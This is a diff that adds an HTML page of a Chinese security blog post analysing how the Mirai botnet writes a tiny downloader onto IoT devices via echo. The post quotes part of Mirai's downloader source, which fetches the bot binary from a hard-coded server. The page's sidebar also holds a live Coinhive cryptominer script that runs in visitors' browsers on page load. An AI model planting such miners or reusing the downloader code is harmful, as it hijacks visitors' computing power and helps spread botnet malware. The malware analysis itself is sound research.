@@ -1,0 +1,671 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>mirai的echo上传文件机制分析 | xd_xd&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="xd_xd">
+    
+
+    
+    <meta name="description" content="物联网设备系统资源有限，所以操作系统都会进行精简。之前在乌云看到对某个智能设备木马的分析，其中采用了使用echo写16进制，写一个简单的wget到设备上。可见这个思路在很早之前就已经被广泛使用了。最近在分析智能设备的过程中，也遇到了同样的问题，想要传一个gdbserver到设备上，但是没有wget之类下载工具，只能采用echo的方式。从想法到实际上完成还是经过了一些尝试。
+Mirai的echo上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mirai的echo上传文件机制分析">
+<meta property="og:url" content="http://xdxd.love/2017/12/26/mirai的echo上传文件机制分析/index.html">
+<meta property="og:site_name" content="xd_xd's blog">
+<meta property="og:description" content="物联网设备系统资源有限，所以操作系统都会进行精简。之前在乌云看到对某个智能设备木马的分析，其中采用了使用echo写16进制，写一个简单的wget到设备上。可见这个思路在很早之前就已经被广泛使用了。最近在分析智能设备的过程中，也遇到了同样的问题，想要传一个gdbserver到设备上，但是没有wget之类下载工具，只能采用echo的方式。从想法到实际上完成还是经过了一些尝试。
+Mirai的echo上传">
+<meta property="og:image" content="http://xdxd.love/images/miraiecho1.png">
+<meta property="og:image" content="http://xdxd.love/images/miraiecho2.png">
+<meta property="og:image" content="http://xdxd.love/images/miraiecho3.png">
+<meta property="og:image" content="http://xdxd.love/images/miraiecho4.png">
+<meta property="og:image" content="http://xdxd.love/images/miraiecho5.png">
+<meta property="og:image" content="http://xdxd.love/images/miraiecho6.png">
+<meta property="og:image" content="http://xdxd.love/images/miraiecho7.png">
+<meta property="og:image" content="http://xdxd.love/images/miraiecho8.png">
+<meta property="og:updated_time" content="2018-01-08T08:35:46.790Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mirai的echo上传文件机制分析">
+<meta name="twitter:description" content="物联网设备系统资源有限，所以操作系统都会进行精简。之前在乌云看到对某个智能设备木马的分析，其中采用了使用echo写16进制，写一个简单的wget到设备上。可见这个思路在很早之前就已经被广泛使用了。最近在分析智能设备的过程中，也遇到了同样的问题，想要传一个gdbserver到设备上，但是没有wget之类下载工具，只能采用echo的方式。从想法到实际上完成还是经过了一些尝试。
+Mirai的echo上传">
+
+    
+    <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+    <style>
+    pre {white-space: pre-wrap;}
+    </style>
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="xd_xd&#39;s blog" title="xd_xd&#39;s blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="xd_xd&#39;s blog">xd_xd&#39;s blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:xdxd.love">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/12/26/mirai的echo上传文件机制分析/" title="mirai的echo上传文件机制分析" itemprop="url">mirai的echo上传文件机制分析</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
+		
+  <p class="article-time">
+    <time datetime="2017-12-26T08:59:19.000Z" itemprop="datePublished"> 發表於 Dec 26 2017</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目錄</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mirai的echo上传文件机制"><span class="toc-number">1.</span> <span class="toc-text">Mirai的echo上传文件机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mirai的tools目录"><span class="toc-number">2.</span> <span class="toc-text">Mirai的tools目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mirai_echo_upload使用的文件"><span class="toc-number">3.</span> <span class="toc-text">Mirai echo upload使用的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译方式"><span class="toc-number">4.</span> <span class="toc-text">编译方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python操作串口"><span class="toc-number">5.</span> <span class="toc-text">python操作串口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#遇到的坑："><span class="toc-number">6.</span> <span class="toc-text">遇到的坑：</span></a></li></ol>
+		
+		</div>
+		
+		<p>物联网设备系统资源有限，所以操作系统都会进行精简。之前在乌云看到对某个智能设备木马的分析，其中采用了使用echo写16进制，写一个简单的wget到设备上。可见这个思路在很早之前就已经被广泛使用了。最近在分析智能设备的过程中，也遇到了同样的问题，想要传一个gdbserver到设备上，但是没有wget之类下载工具，只能采用echo的方式。从想法到实际上完成还是经过了一些尝试。</p>
+<h2 id="Mirai的echo上传文件机制">Mirai的echo上传文件机制</h2><p>针对Mirai已经有了不少的分析文章，大多集中在分析bot的功能，对echo的上传的文件的方式也有提及。但是缺少一些能在实际项目中应用的细节。下面截图出自RSA会议的截图。</p>
+<p><img src="/images/miraiecho1.png" alt=""></p>
+<p>Mirai在源码中定义了3中下载bot的方式。</p>
+<p><img src="/images/miraiecho2.png" alt=""></p>
+<p>显然，echo的方式是最通用的。通过直接16进制到文件。</p>
+<h2 id="Mirai的tools目录">Mirai的tools目录</h2><p>接下来只要搞定echo哪个文件就可以了，直接echo一个大文件显然是不现实的，需要找一个有下载文件功能的足够小的程序。首先关注到的是Mirai的tools的文件夹。显然wget.c应该是下载文件用的。</p>
+<p>下图是绿盟科技在<a href="http://blog.nsfocus.net/mirai-source-analysis-report/" target="_blank" rel="external">Mirai源码分析报告</a>的截图。不过他这里有个小失误，wget确实是下载文件用的。但是作者在测试的时候，直接运行的wget命令，显然是操作系统自带的wget工具。</p>
+<p><img src="/images/miraiecho3.png" alt=""></p>
+<p>mirai的wget的命令格式为： wget ip_address remote_file host</p>
+<p><img src="/images/miraiecho4.png" alt=""></p>
+<p><img src="/images/miraiecho5.png" alt=""></p>
+<p>经过测试，发现指定-static参数之后，这个wget大小也有几百K。放在那跑了一晚上，第二天一看设备挂掉了。。。。</p>
+<h2 id="Mirai_echo_upload使用的文件">Mirai echo upload使用的文件</h2><p>mirai使用echo方式上传的时候，首先上传一个很小的文件，用于下载mirai。大小为1K左右。目录为dlr<br><img src="/images/miraiecho6.png" alt=""></p>
+<p>大部分分析文章都忽略了这个文件夹。其中，main.c是源码，build.sh是编译脚本，release是编译完成的2进制文件。</p>
+<p>先看一下build.sh<br><img src="/images/miraiecho7.png" alt=""></p>
+<p>可以看到他采用了一些优化的手段来减少最终的文件的大小。经过strip之后，文件体积大致为原来的一半左右。</p>
+<p>main.c中下载的地址都是写死的，编译之前需要修改ip和文件名。</p>
+<pre><code>    <span class="preprocessor">#<span class="keyword">define</span> HTTP_SERVER utils_inet_addr(<span class="number">127</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">// CHANGE TO YOUR HTTP SERVER IP</span></span>
+
+<span class="preprocessor">#<span class="keyword">ifdef</span> DEBUG</span>
+<span class="built_in">printf</span>(<span class="string">"Connected to host\n"</span>);
+<span class="preprocessor">#<span class="keyword">endif</span></span>
+
+<span class="keyword">if</span> (write(sfd, <span class="string">"GET /bins/mirai."</span> BOT_ARCH <span class="string">" HTTP/1.0\r\n\r\n"</span>, <span class="number">16</span> + arch_strlen + <span class="number">13</span>) != (<span class="number">16</span> + arch_strlen + <span class="number">13</span>))
+{
+<span class="preprocessor">#<span class="keyword">ifdef</span> DEBUG</span>
+<span class="built_in">printf</span>(<span class="string">"Failed to send get request.\n"</span>);
+<span class="preprocessor">#<span class="keyword">endif</span></span>
+以及增加
+<span class="preprocessor">#<span class="keyword">define</span> DEBUG </span>
+</code></pre><p>用来输出调试信息。</p>
+<h2 id="编译方式">编译方式</h2><p>参考<a href="https://paper.seebug.org/papers/Archive/Mirai%E6%9C%A8%E9%A9%AC%E6%80%BB%E7%BB%93%E2%80%94%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%8D%E6%B1%87%E7%BC%96.pdf" target="_blank" rel="external">Mirai木马总结—从源码到反汇编</a></p>
+<h2 id="python操作串口">python操作串口</h2><p>代码实现也有遇到一些问题，比如一次写多少个字节效率最高。mirai是一次写128个字节。</p>
+<p><img src="/images/miraiecho8.png" alt=""></p>
+<p>具体代码关注公众号获取~~</p>
+<h2 id="遇到的坑：">遇到的坑：</h2><p>1，mac上输入串口密码的问题<br>2，文件的大小端?<br>3,   不明原因的卡死<br>4, 长时间写串口把设备写重启。<br>5，cc1: error: main.c: Value too large for defined data type<br>磁盘mount的问题。在docker挂载的目录中编译导致的，直接copy到docker里面编译即可。<br><a href="https://stackoverflow.com/questions/2438890/cc1plus-error-include-value-too-large-for-defined-data-type-when-compiling-wi" target="_blank" rel="external">https://stackoverflow.com/questions/2438890/cc1plus-error-include-value-too-large-for-defined-data-type-when-compiling-wi</a><br>6,编译版本的问题导致illegial instruction</p>
+<p>mirai编译的文档中只有armv4,armv5,armv6的版本，但是给出的bin中却有v7的版本，在我使用的设备上，只有v7是可以执行的，其他都是报非法的指令错误。使用<a href="https://github.com/dockcross/dockcross" target="_blank" rel="external">https://github.com/dockcross/dockcross</a> 编译成功。</p>
+<p>7，gdbserver编译 <a href="https://github.com/mzpqnxow/gdb-static-cross" target="_blank" rel="external">https://github.com/mzpqnxow/gdb-static-cross</a></p>
+<p>参考资料：</p>
+<p><a href="http://blog.nsfocus.net/mirai-source-analysis-report/" target="_blank" rel="external">http://blog.nsfocus.net/mirai-source-analysis-report/</a><br><a href="http://www.freebuf.com/articles/terminal/117927.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/117927.html</a><br><a href="https://xmsg.org/wordpress/2016/12/mirai%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90ppt-%E5%88%86%E6%9E%90%E4%BA%86mirai-ddos%E7%89%B9%E6%80%A7-%E5%B9%B6%E7%BB%99%E5%87%BA%E4%BA%86mirai-ddos%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/" target="_blank" rel="external">https://xmsg.org/wordpress/2016/12/mirai%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90ppt-%E5%88%86%E6%9E%90%E4%BA%86mirai-ddos%E7%89%B9%E6%80%A7-%E5%B9%B6%E7%BB%99%E5%87%BA%E4%BA%86mirai-ddos%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/</a><br><a href="http://www.nolanzong.com/2017/01/09/mirai-setup/" target="_blank" rel="external">http://www.nolanzong.com/2017/01/09/mirai-setup/</a></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<p>个人微信公众号</p>
+<img src="/images/coffee.png">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/万物互联/">万物互联</a>
+</div>
+
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://xdxd.love/2017/12/26/mirai的echo上传文件机制分析/" data-title="mirai的echo上传文件机制分析 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2017/11/09/samba-cve-2007-2446-堆溢出分析/"  title="samba cve-2007-2446 堆溢出分析">
+ <strong>下一篇：</strong><br/> 
+ <span>samba cve-2007-2446 堆溢出分析
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2017/12/26/mirai的echo上传文件机制分析/" data-title="mirai的echo上传文件机制分析" data-url="http://xdxd.love/2017/12/26/mirai的echo上传文件机制分析/"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目錄</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mirai的echo上传文件机制"><span class="toc-number">1.</span> <span class="toc-text">Mirai的echo上传文件机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mirai的tools目录"><span class="toc-number">2.</span> <span class="toc-text">Mirai的tools目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mirai_echo_upload使用的文件"><span class="toc-number">3.</span> <span class="toc-text">Mirai echo upload使用的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译方式"><span class="toc-number">4.</span> <span class="toc-text">编译方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python操作串口"><span class="toc-number">5.</span> <span class="toc-text">python操作串口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#遇到的坑："><span class="toc-number">6.</span> <span class="toc-text">遇到的坑：</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<aside class="clearfix">
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 訂閱</a>
+</div>
+
+  
+  <div class="widget-wrap">
+    <img src="/images/coffee.png" width="100%" height="100%"/>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('JEqHgeGovuDan86e2TgeOO65ITKCk93T', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>  
+  </div>
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分類</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/cve-and-others/" title="cve and others">cve and others<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/万物互联/" title="万物互联">万物互联<sup>12</sup></a></li>
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/人生苦短/" title="人生苦短">人生苦短<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/代码审计/" title="代码审计">代码审计<sup>29</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/前端安全/" title="前端安全">前端安全<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/加密解密/" title="加密解密">加密解密<sup>3</sup></a></li>
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/折腾不止/" title="折腾不止">折腾不止<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/渗透测试/" title="渗透测试">渗透测试<sup>10</sup></a></li>
+		  
+		
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/移动安全/" title="移动安全">移动安全<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/黑盒测试/" title="黑盒测试">黑盒测试<sup>8</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">標簽</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mips/" title="mips">mips<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/支付漏洞/" title="支付漏洞">支付漏洞<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mysql/" title="mysql">mysql<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xss/" title="xss">xss<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sqlmap/" title="sqlmap">sqlmap<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tcpdump/" title="tcpdump">tcpdump<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/逻辑漏洞/" title="逻辑漏洞">逻辑漏洞<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/密码学/" title="密码学">密码学<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/固件/" title="固件">固件<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/inspeckage/" title="inspeckage">inspeckage<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/csrf/" title="csrf">csrf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/github/" title="github">github<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xposed/" title="xposed">xposed<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/折腾/" title="折腾">折腾<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php-wdcp/" title="php,wdcp">php,wdcp<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XXE/" title="XXE">XXE<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情鏈接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.heysec.org/" target="_blank" title="heysec.org">heysec.org</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://sco4x0.com" target="_blank" title="sco4x0&#39;s blog">sco4x0&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://virusdefender.net" target="_blank" title="virusdefender&#39;s blog">virusdefender&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.hackersb.cn/" target="_blank" title="Striker&#39;s blog">Striker&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.leavesongs.com/" target="_blank" title="离别歌">离别歌</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.stardustsky.net/" target="_blank" title="Stardustsky博客">Stardustsky博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.waitalone.cn/" target="_blank" title="独自等待">独自等待</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/S4b0r/" target="_blank" title="S4b0r&#39; blog">S4b0r&#39; blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.leesec.com/" target="_blank" title="leesec">leesec</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://xss1.com/" target="_blank" title="0x_Jin">0x_Jin</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://bl4ck.in/" target="_blank" title="Tomato">Tomato</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.hackfun.org/" target="_blank" title="4ido10n">4ido10n</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.lynahex.com/" target="_blank" title="lynahex&#39;s blog">lynahex&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.codersec.net/" target="_blank" title="Bsmali4很忙">Bsmali4很忙</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://blog.leanote.com/thorns" target="_blank" title="thorns">thorns</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+</aside>
+</div>
+    </div>
+    <footer></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#nothing"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"xdxd"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1253479891'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1253479891' type='text/javascript'%3E%3C/script%3E"));</script>
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回頂部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
